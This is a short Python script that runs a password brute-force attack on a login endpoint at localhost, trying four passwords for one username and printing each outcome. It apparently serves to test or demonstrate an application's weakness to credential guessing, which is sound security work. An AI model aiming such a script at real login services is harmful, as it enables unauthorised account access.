import requests

# URL of the login endpoint
url = "http://127.0.0.1:5000/login"

# Credentials to test
username = "User1234"

password_list = ["aaaaa", "abaaa", "abcde", "password123"]

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, json={"username": username, "password": password})
        if response.status_code == 200:
            print(f"Success! Username: {username}, Password: {password}")
            return
        else:
            print(f"Failed attempt. Username: {username}, Password: {password}, Response: {response.json()}")

    print("Brute force attack completed. No valid credentials found.")

brute_force_login(url, username, password_list)
